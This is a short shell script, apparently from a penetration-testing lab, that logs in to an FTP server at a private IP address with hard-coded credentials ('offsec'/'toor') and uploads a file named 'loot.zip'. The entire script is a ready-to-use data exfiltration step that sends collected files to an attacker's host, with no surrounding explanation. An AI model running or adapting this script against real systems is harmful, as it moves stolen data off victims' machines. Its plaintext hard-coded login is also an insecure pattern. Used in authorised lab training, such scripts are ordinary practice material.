#!/bin/sh
HOST='10.11.0.154'
USER='offsec'
PASSWD='toor'
FILE='loot.zip'

ftp -n $HOST <<END_SCRIPT
quote USER $USER
quote PASS $PASSWD
binary
put $FILE
quit
END_SCRIPT
exit 0
